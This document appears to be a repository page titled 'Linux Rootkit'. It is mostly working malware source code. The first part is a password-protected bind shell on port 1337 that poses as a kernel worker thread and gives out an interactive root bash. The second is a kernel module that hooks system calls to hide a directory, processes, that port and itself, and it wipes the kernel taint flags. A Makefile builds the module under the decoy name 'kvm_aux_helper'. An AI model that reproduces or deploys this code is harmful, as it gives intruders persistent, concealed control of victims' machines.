
# Linux Rootkit
## Bind Shell
```c++
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <poll.h>
#include <pty.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>

#define MASQ  "kworker/u8:1"
#define MASQ2 "[kworker/u8:1]"

static const unsigned char PW[] = {0x2f, 0x34, 0x33, 0x22, 0x1a, 0x28, 0x6a, 0x6a, 0x2e};
#define PWKEY 0x5a
#define PWLEN (sizeof PW)

static int pw_ok(const char *in) {
    int diff = 0;
    for (size_t i = 0; i < PWLEN; i++) {
        unsigned char c = (unsigned char)in[i];
        diff |= (int)(c ^ PW[i] ^ PWKEY);
    }
    return diff == 0 && in[PWLEN] == 0;
}

/* read one line, 20s timeout, strips CRLF */
static int read_line(int s, char *out, size_t cap) {
    size_t i = 0;
    out[0] = 0;
    for (;;) {
        struct pollfd pf = {s, POLLIN, 0};
        if (poll(&pf, 1, 20000) <= 0) return 0;
        ssize_t n = recv(s, out + i, cap - 1 - i, 0);
        if (n <= 0) return 0;
        size_t start = i;
        i += (size_t)n;
        out[i] = 0;
        char *nl = (char *)memchr(out + start, '\n', (size_t)n);
        if (nl) {
            if (nl > out && nl[-1] == '\r') nl[-1] = 0;
            *nl = 0;
            return 1;
        }
        if (i >= cap - 1) return 1;
    }
}

static int auth(int s) {
    static const char prompt[] = "Password: ";
    for (int t = 0; t < 3; t++) {
        if (write(s, prompt, sizeof prompt - 1) <= 0) return 0;
        char pw[64];
        if (!read_line(s, pw, sizeof pw)) return 0;
        if (pw_ok(pw)) {
            write(s, "\n", 1);
            return 1;
        }
        struct timespec ts = {1, 0};
        nanosleep(&ts, nullptr);
        if (write(s, "Authentication failure\n", 23) <= 0) return 0;
    }
    return 0;
}

static void handle(int s) {
    prctl(PR_SET_NAME, MASQ, 0, 0, 0);
    if (!auth(s)) { close(s); return; }

    int master;
    struct winsize ws = {24, 80, 0, 0};
    pid_t pid = forkpty(&master, nullptr, nullptr, &ws);
    if (pid < 0) { close(s); return; }
    if (pid == 0) {
        signal(SIGCHLD, SIG_DFL);
        prctl(PR_SET_NAME, "-bash", 0, 0, 0);
        setenv("TERM", "xterm-256color", 1);
        setenv("PS1", "\\[\\e[32m\\]\\u@\\h\\[\\e[0m\\]:\\w\\$ ", 1);
        execl("/bin/bash", "-bash", "-i", (char *)nullptr);
        _exit(1);
    }

    struct pollfd p[2] = {{s, POLLIN, 0}, {master, POLLIN, 0}};
    char buf[8192];
    for (;;) {
        if (poll(p, 2, -1) < 0) { if (errno == EINTR) continue; break; }
        for (int i = 0; i < 2; i++) {
            if (!(p[i].revents & (POLLIN | POLLHUP | POLLERR))) continue;
            ssize_t n = read(p[i].fd, buf, sizeof buf);
            if (n <= 0) goto done;
            int out = p[1 - i].fd;
            for (ssize_t off = 0; off < n;) {
                ssize_t w = write(out, buf + off, n - off);
                if (w <= 0) { if (errno == EINTR) continue; goto done; }
                off += w;
            }
        }
    }
done:
    close(master);
    close(s);
    kill(pid, SIGKILL);
    waitpid(pid, nullptr, 0);
}

int main(int argc, char **argv) {
    prctl(PR_SET_NAME, MASQ, 0, 0, 0);
    if (argv && argv[0]) {
        size_t cap = strlen(argv[0]);
        if (cap >= sizeof(MASQ2) - 1) {
            memset(argv[0], 0, cap);
            memcpy(argv[0], MASQ2, sizeof(MASQ2) - 1);
        }
    }
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);

    int one = 1;
    int l = socket(AF_INET, SOCK_STREAM, 0);
    if (l < 0) return 1;
    setsockopt(l, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one);

    struct sockaddr_in a;
    memset(&a, 0, sizeof a);
    a.sin_family = AF_INET;
    a.sin_port = htons(1337);
    a.sin_addr.s_addr = INADDR_ANY;
    if (bind(l, (struct sockaddr *)&a, sizeof a) < 0) return 0; /* already up: exit 0, no restart storm */
    if (listen(l, 8) < 0) return 1;

    for (;;) {
        int s = accept(l, nullptr, nullptr);
        if (s < 0) continue;
        setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &one, sizeof one);
        if (fork() == 0) {
            close(l);
            signal(SIGCHLD, SIG_DFL);                                                        handle(s);
            _exit(0);
        }
        close(s);
    }
}
```
## Kernel Rootkit AMD Architecture Debian Based
- Directory Hide
- Process Hide
- Port Hide
- Self Hide

**Kernel Rootkit Source Code**
```c
// SPDX-License-Identifier: GPL-2.0
/* rootkit - kernel-side visibility filter */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/uaccess.h>
#include <linux/uio.h>
#include <linux/slab.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/magic.h>
#include <linux/sched.h>
#include <linux/sched/signal.h>
#include <linux/sched/task.h>
#include <linux/pid.h>
#include <linux/net.h>
#include <linux/netlink.h>
#include <linux/sock_diag.h>
#include <linux/inet_diag.h>
#include <linux/string.h>

#define HIDE_PORT	1337
#define MASK		"kworker/u8:1"
#define HIDDEN_DIR	".dbus-1"
#define MAX_PIDS	128
#define MAXBUF		(64 * 1024)

struct ld64 {
	u64 d_ino;
	s64 d_off;
	u16 d_reclen;
	u8  d_type;
	char d_name[];
};

/* ================= task matching ================= */
static int task_hidden(struct task_struct *t)
{
	struct task_struct *p = t;
	int i;

	for (i = 0; i < 8 && p; i++) {
		if (p->comm[0] && !strncmp(p->comm, MASK, sizeof(MASK) - 1))
			return 1;
		p = p->real_parent;
	}
	return 0;
}

static int collect_pids(pid_t *out, int max)
{
	struct task_struct *t;
	int n = 0;

	rcu_read_lock();
	for_each_process(t) {
		if (n >= max)
			break;
		if (task_hidden(t))
			out[n++] = task_pid_nr(t);
	}
	rcu_read_unlock();
	return n;
}

/* ================= directory filtering (getdents64) ================= */
struct gdctx { int fd; unsigned long ubuf; };

static int classify_dir(struct dentry *d)
{
	const char *n;

	if (!d || !d->d_sb)
		return 0;
	n = d->d_name.name;
	if (d == d->d_sb->s_root) {
		if (d->d_sb->s_magic == PROC_SUPER_MAGIC)
			return 1;
		if (d->d_sb->s_magic == SYSFS_MAGIC)
			return 3;
	}
	if (!strcmp(n, HIDDEN_DIR))
		return 2;
	if (!strcmp(n, "lib") && d->d_parent &&
	    !strcmp(d->d_parent->d_name.name, "usr"))
		return 4;
	return 0;
}

static int entry_dropped(const char *nm, int mode, const pid_t *pids, int np)
{
	if (!strcmp(nm, HIDDEN_DIR))
		return 1;
	if (mode == 2)
		return 1;
	if (mode == 3)
		return !strcmp(nm, KBUILD_MODNAME);
	if (mode == 1) {
		unsigned long v = 0;
		int i = 0;

		if (nm[0] < '0' || nm[0] > '9')
			return 0;
		while (nm[i] >= '0' && nm[i] <= '9') {
			v = v * 10 + (unsigned long)(nm[i] - '0');
			if (++i > 9)
				return 0;
		}
		if (nm[i])
			return 0;
		for (i = 0; i < np; i++)
			if ((pid_t)v == pids[i])
				return 1;
	}
	return 0;
}

static int gd_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct gdctx *c = (struct gdctx *)ri->data;
	struct pt_regs *r = (struct pt_regs *)regs->di;

	c->fd = (int)r->di;
	c->ubuf = r->si;
	return 0;
}

static int gd_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct gdctx *c = (struct gdctx *)ri->data;
	long ret = (long)regs->ax;
	struct fd f;
	int mode;
	pid_t pids[MAX_PIDS];
	int np = 0;
	struct ld64 *b;
	unsigned long len, off = 0, out = 0;

	if (ret <= 0)
		return 0;
	len = (unsigned long)ret;
	if (len > MAXBUF)
		return 0;

	f = fdget(c->fd);
	if (!f.file)
		return 0;
	mode = classify_dir(f.file->f_path.dentry);
	if (mode == 1)
		np = collect_pids(pids, MAX_PIDS);
	fdput(f);
	if (!mode)
		return 0;

	b = kmalloc(len, GFP_ATOMIC);
	if (!b)
		return 0;
	if (copy_from_user(b, (void __user *)c->ubuf, len)) {
		kfree(b);
		return 0;
	}

	while (off + offsetof(struct ld64, d_name) + 2 <= len) {
		struct ld64 *e = (struct ld64 *)((char *)b + off);
		unsigned int rl = e->d_reclen, nl;
		char nm[80];

		if (rl < offsetof(struct ld64, d_name) + 2 || off + rl > len)
			break;
		nl = rl - offsetof(struct ld64, d_name);
		if (nl >= sizeof(nm))
			nl = sizeof(nm) - 1;
		memcpy(nm, e->d_name, nl);
		nm[nl] = 0;

		if (!entry_dropped(nm, mode, pids, np)) {
			if (out != off)
				memmove((char *)b + out, e, rl);
			out += rl;
		}
		off += rl;
	}

	if (out != len) {
		if (out && copy_to_user((void __user *)c->ubuf, b, out)) {
			kfree(b);
			return 0;
		}
		regs->ax = (long)out;
	}
	kfree(b);
	return 0;
}

/* ================= /proc text filtering (seq_read / seq_read_iter) ========= */
static int hex4(const char *q, const char *end)
{
	unsigned int v = 0;
	int i;

	if (end - q < 4)
		return -1;
	for (i = 0; i < 4; i++) {
		char c = q[i];

		if (c >= '0' && c <= '9')
			v = v * 16 + (unsigned int)(c - '0');
		else if (c >= 'A' && c <= 'F')
			v = v * 16 + (unsigned int)(c - 'A' + 10);
		else if (c >= 'a' && c <= 'f')
			v = v * 16 + (unsigned int)(c - 'a' + 10);
		else
			return -1;
	}
	return (int)v;
}

static int tcp_line_hidden(const char *l, unsigned long n)
{
	const char *end = l + n;
	const char *c1, *c2, *c3;

	c1 = memchr(l, ':', n);
	if (!c1)
		return 0;
	c2 = memchr(c1 + 1, ':', (size_t)(end - c1 - 1));
	if (!c2)
		return 0;
	c3 = memchr(c2 + 1, ':', (size_t)(end - c2 - 1));
	if (hex4(c2 + 1, end) == HIDE_PORT)
		return 1;
	if (c3 && hex4(c3 + 1, end) == HIDE_PORT)
		return 1;
	return 0;
}

static int proc_kind(struct file *file)
{
	struct dentry *d;

	if (!file)
		return 0;
	d = file->f_path.dentry;
	if (!d || !d->d_sb || d->d_sb->s_magic != PROC_SUPER_MAGIC)
		return 0;
	if (!strcmp(d->d_name.name, "tcp") || !strcmp(d->d_name.name, "tcp6"))
		return 1;
	if (!strcmp(d->d_name.name, "modules"))
		return 2;
	return 0;
}

static void filter_text(void __user *ub, unsigned long len, int kind,
			struct pt_regs *regs)
{
	char *b;
	unsigned long off = 0, out = 0;

	b = kmalloc(len, GFP_ATOMIC);
	if (!b)
		return;
	if (copy_from_user(b, ub, len)) {
		kfree(b);
		return;
	}

	while (off < len) {
		char *nl = memchr(b + off, '\n', len - off);
		unsigned long ll = (nl ? (unsigned long)(nl - (b + off)) + 1
				       : len - off);
		int drop;

		if (kind == 1)
			drop = tcp_line_hidden(b + off, ll);
		else
			drop = ll > sizeof(KBUILD_MODNAME) &&
			       !strncmp(b + off, KBUILD_MODNAME,
					sizeof(KBUILD_MODNAME) - 1) &&
			       (b + off)[sizeof(KBUILD_MODNAME) - 1] == ' ';

		if (!drop) {
			if (out != off)
				memmove(b + out, b + off, ll);
			out += ll;
		}
		off += ll;
		if (!nl)
			break;
	}

	if (out != len) {
		if (out && copy_to_user(ub, b, out)) {
			kfree(b);
			return;
		}
		regs->ax = (long)out;
	}
	kfree(b);
}

struct srctx { struct file *file; unsigned long ubuf; };

static int sr_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct srctx *c = (struct srctx *)ri->data;

	c->file = (struct file *)regs->di;
	c->ubuf = regs->si;
	return 0;
}

static int sr_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct srctx *c = (struct srctx *)ri->data;
	long ret = (long)regs->ax;
	int kind;

	if (ret <= 0 || (unsigned long)ret > MAXBUF)
		return 0;
	kind = proc_kind(c->file);
	if (!kind)
		return 0;
	filter_text((void __user *)c->ubuf, (unsigned long)ret, kind, regs);
	return 0;
}

struct sictx { struct file *file; unsigned long ubuf; };

static int si_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct sictx *c = (struct sictx *)ri->data;
	struct kiocb *iocb = (struct kiocb *)regs->di;
	struct iov_iter *it = (struct iov_iter *)regs->si;

	c->file = (iocb && iocb->ki_filp) ? iocb->ki_filp : NULL;
	c->ubuf = (it && iter_is_iovec(it)) ? (unsigned long)it->iov->iov_base : 0;
	return 0;
}

static int si_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct sictx *c = (struct sictx *)ri->data;
	long ret = (long)regs->ax;
	int kind;

	if (ret <= 0 || !c->ubuf || (unsigned long)ret > MAXBUF)
		return 0;
	kind = proc_kind(c->file);
	if (!kind)
		return 0;
	filter_text((void __user *)c->ubuf, (unsigned long)ret, kind, regs);
	return 0;
}

/* ================= netlink sock_diag filtering (ss) ================= */
struct nlctx { struct socket *sock; struct msghdr *msg; };

static int nl_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct nlctx *c = (struct nlctx *)ri->data;

	c->sock = (struct socket *)regs->di;
	c->msg = (struct msghdr *)regs->si;
	return 0;
}

static int nl_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
	struct nlctx *c = (struct nlctx *)ri->data;
	long ret = (long)regs->ax;
	struct nlmsghdr *nh;
	unsigned long len, off = 0, out = 0;
	char *b;
	void __user *ub;

	if (ret <= 0 || !c->sock || !c->sock->sk || !c->msg)
		return 0;
	if (c->sock->sk->sk_family != AF_NETLINK ||
	    c->sock->sk->sk_protocol != NETLINK_SOCK_DIAG)
		return 0;
	if (!iter_is_iovec(&c->msg->msg_iter))
		return 0;
	ub = c->msg->msg_iter.iov[0].iov_base;
	if (!ub)
		return 0;
	len = (unsigned long)ret;
	if (len > MAXBUF)
		return 0;

	b = kmalloc(len, GFP_ATOMIC);
	if (!b)
		return 0;
	if (copy_from_user(b, ub, len)) {
		kfree(b);
		return 0;
	}

	while (off + NLMSG_HDRLEN <= len) {
		int drop = 0;
		unsigned long mlen;

		nh = (struct nlmsghdr *)(b + off);
		mlen = nh->nlmsg_len;
		if (mlen < NLMSG_HDRLEN || off + mlen > len)
			break;
		if (nh->nlmsg_type == SOCK_DIAG_BY_FAMILY &&
		    mlen >= NLMSG_LENGTH(sizeof(struct inet_diag_msg))) {
			struct inet_diag_msg *m = NLMSG_DATA(nh);

			if (m->idiag_family == AF_INET &&
			    (m->id.idiag_sport == htons(HIDE_PORT) ||
			     m->id.idiag_dport == htons(HIDE_PORT)))
				drop = 1;
		}
		if (!drop) {
			if (out != off)
				memmove(b + out, b + off, mlen);
			out += mlen;
		}
		off += NLMSG_ALIGN(mlen);
	}

	if (out != len) {
		if (out && copy_to_user(ub, b, out)) {
			kfree(b);
			return 0;
		}
		regs->ax = (long)out;
	}
	kfree(b);
	return 0;
}

/* ================= registration ================= */
static struct kretprobe kr_gd = {
	.kp.symbol_name = "__x64_sys_getdents64",
	.entry_handler = gd_entry, .handler = gd_ret,
	.data_size = sizeof(struct gdctx), .maxactive = 64,
};

static struct kretprobe kr_sr = {
	.kp.symbol_name = "seq_read",
	.entry_handler = sr_entry, .handler = sr_ret,
	.data_size = sizeof(struct srctx), .maxactive = 64,
};

static struct kretprobe kr_si = {
	.kp.symbol_name = "seq_read_iter",
	.entry_handler = si_entry, .handler = si_ret,
	.data_size = sizeof(struct sictx), .maxactive = 64,
};

static struct kretprobe kr_nl = {
	.kp.symbol_name = "netlink_recvmsg",
	.entry_handler = nl_entry, .handler = nl_ret,
	.data_size = sizeof(struct nlctx), .maxactive = 32,
};

typedef unsigned long (*kln_t)(const char *);
static kln_t kln;
static struct kprobe kp_kln = { .symbol_name = "kallsyms_lookup_name" };

static void clean_taint(void)
{
	unsigned long *tm;

	if (!kln)
		return;
	tm = (unsigned long *)kln("tainted_mask");
	if (tm)
		*tm &= ~(unsigned long)((1UL << 12) | (1UL << 13));
}

static void taint_work_fn(struct work_struct *w)
{
	clean_taint();
}
static DECLARE_DELAYED_WORK(taint_work, taint_work_fn);

static int __init aux_init(void)
{
	if (register_kprobe(&kp_kln) == 0) {
		kln = (kln_t)kp_kln.addr;
		unregister_kprobe(&kp_kln);
	}
	if (register_kretprobe(&kr_gd))
		pr_err("aux: gd fail\n");
	if (register_kretprobe(&kr_sr))
		pr_err("aux: sr fail\n");
	if (register_kretprobe(&kr_si))
		pr_err("aux: si fail\n");
	if (register_kretprobe(&kr_nl))
		pr_err("aux: nl fail\n");
	schedule_delayed_work(&taint_work, msecs_to_jiffies(3000));
	return 0;
}

static void __exit aux_exit(void)
{
	cancel_delayed_work_sync(&taint_work);
	unregister_kretprobe(&kr_nl);
	unregister_kretprobe(&kr_si);
	unregister_kretprobe(&kr_sr);
	unregister_kretprobe(&kr_gd);
}

MODULE_LICENSE("GPL");
module_init(aux_init);
module_exit(aux_exit);
```
## Makefile
```Makefile
obj-m := kvm_aux_helper.o
ccflags-y := -Os
KDIR ?= /lib/modules/$(shell uname -r)/build
all:
	make -C $(KDIR) M=$(PWD) modules
clean:
	make -C $(KDIR) M=$(PWD) clean

```
